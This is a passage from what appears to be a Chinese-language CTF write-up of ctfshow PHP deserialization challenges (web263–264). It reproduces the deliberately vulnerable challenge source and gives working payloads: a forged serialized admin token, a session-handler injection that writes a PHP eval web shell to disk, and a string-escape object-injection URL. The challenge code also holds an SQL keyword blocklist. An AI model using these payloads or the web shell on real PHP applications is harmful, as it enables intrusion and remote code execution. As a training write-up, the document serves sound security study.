class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这跟index有关系吗</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#Tzo3OiJtZXNzYWdlIjoxOntzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406152246816.png" alt="image-20220406152246816"></p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406152549970.png" alt="image-20220406152549970"></p><p>源码呢,快给我源码,别扫太快,不然全是503</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406152827569.png" alt="image-20220406152827569"></p><h2 id="php三种处理器对-SESSION数据进行序列化和反序列化"><a href="#php三种处理器对-SESSION数据进行序列化和反序列化" class="headerlink" title="php三种处理器对$_SESSION数据进行序列化和反序列化"></a>php三种处理器对$_SESSION数据进行序列化和反序列化</h2><ul><li>php在session存储和读取的时候,都会有一个序列化和反序列化的过程,php内置了多种处理器用于存取$_SESSION数据,都会对数据序列化和反序列化,源码中有session_start的时候会读取session,从而进行反序列化</li><li>php.ini中默认session.serialize_handler为php_serialize,而index.php中将其设置为php,这个差异导致了session的反序列化问题</li><li>php有三种处理器对$_SESSION数据进行序列化和反序列化</li></ul><table><thead><tr><th>选择器</th><th>存储格式</th><th>样例 $_SESSION[‘name’]&#x3D;’ocean’</th></tr></thead><tbody><tr><td>php_serialize</td><td>经过serialize()函数序列化数组</td><td>a:1:{s:4:“name”;s:5:“ocean”;}</td></tr><tr><td>php(默认)</td><td>键名 竖线 经过serialize()函数处理的值</td><td>name|s:5:“ocean”;</td></tr><tr><td>php_binary</td><td>键名的长度对应的ascii字符佳宁serialize()函数序列化的值</td><td>name s:6:“spoock”;</td></tr></tbody></table><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;<span class="comment">#注意下面的limit是错误的哦仔细看,所以这里只会执行后面的cookie的limit=session的limit哦</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//登陆成功取消次数累计</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//登陆失败累计次数加1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>小小观察一手,发现没什么可以利用的点,但是发现了包含了&#x2F;inc&#x2F;inc.php也就是一个配置信息</p><p>inc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);<span class="comment">#这里设置了session.serialize_handler为php而index.php中默认是php_serialize要注意的是index.php中没有包含这个文件</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        <span class="title class_">PDO</span>::ATTR_CASE =&gt; <span class="title class_">PDO</span>::CASE_NATURAL</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">#这里给了一个写入文件的方法,没过滤可以利用</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable language_">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable language_">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable language_">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.php页面session.serialize_handler为php_serialize,存储在里面的值是经过序列化的,check.php和inc&#x2F;inc.php的session.seralize_handler为php,而且使用了session_start(),可以读取session文件进行反序列化操作.如果不进行操作,index.php页面存储的session是不能正常在check.php和inc.php进行反序列化的,但是我们可以在属性的值中间加入|.这样在check.php和inc&#x2F;inc.php页面进行放序列化的时候|前面的就会被看做键名,会对|后面进行反序列化.</p><p>这里的构造主要是要放入session文件里面,这里的session不能让index.php页面执行,但是要让check.php和&#x2F;inc&#x2F;inc.php页面执行,那么的话就是可以使用php方式存储进去</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;2.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgZXZhbCgkX1BPU1RbemZdKTs%2FPiI7fQ%3D%3D</span></span><br></pre></td></tr></table></figure><p>这里我们只是存储进去,如果要生成的话就需要访问check.php文件来生成log-zf.php文件</p><p>这里的文件名好像只能是数字的别的就是访问不到</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406163546200.png" alt="image-20220406163546200"></p><p>访问check.php文件进行反序列化</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406163631199.png" alt="image-20220406163631199"></p><p>访问log-2.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406163720062.png" alt="image-20220406163720062"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406163747519.png" alt="image-20220406163747519"></p><h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment">  message.php</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title class_">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>还有message.php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里稍稍有点改变,也就是解码的是session的msg而不是cookie的msg</p><p>那么就变成了字符串逃逸问题了,每有一个fuck就会逃逸出来一个字符</p><p>先让我们看看它原来是什么样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;fuck&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="comment">#O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;这是原来的</span></span><br><span class="line"><span class="comment">#O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;这是进行了替换之后的,当然这里就不能进行反序列化了</span></span><br></pre></td></tr></table></figure><p>但是可以看到没一个fuck就会多出一个字符来.那么这样</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:5:&quot;fuck&quot;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;如果我传入一个fuck&quot;</span></span><br><span class="line"><span class="comment">#O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:5:&quot;loveU&quot;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;仔细观察就会发现到s:5:&quot;loveU&quot;&quot;这里是多了一个单引号,但是前面是成功闭合了的.如果我直接在这里进行中断呢</span></span><br><span class="line"><span class="comment">#O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:5:&quot;loveU&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;是不是就结束了啊,不过这里是直接加的我们可以构造一下</span></span><br></pre></td></tr></table></figure><p>这个是我们像要的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;fuck&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>仔细看哦就是这一部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><p>那么总共多少个呢总共27个,那么我们就需要27个fuck</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;message&quot;:2:&#123;s:2:&quot;to&quot;;s:4:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:4:&quot;user&quot;;&#125;</span><br></pre></td></tr></table></figure><p>那么自己手动拼接起来是这样的,但是前面的4肯定是不对的,但是你可以仔细观察,这个值不是我们传进去的吗,序列化生成的当然对</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?f=x&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 这里不要用hackbar传哦</span><br><span class="line">message.php</span><br><span class="line">改一下cookie</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406181123810.png" alt="image-20220406181123810"></p><p>不要用hackbar传哦</p><h2 id="PHP字符逃逸导致的对象注入"><a href="#PHP字符逃逸导致的对象注入" class="headerlink" title="PHP字符逃逸导致的对象注入"></a>PHP字符逃逸导致的对象注入</h2><p>​     序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了serialize函数之后，要是放在序列化之前应该就不会产生这个问题 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;zz&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span 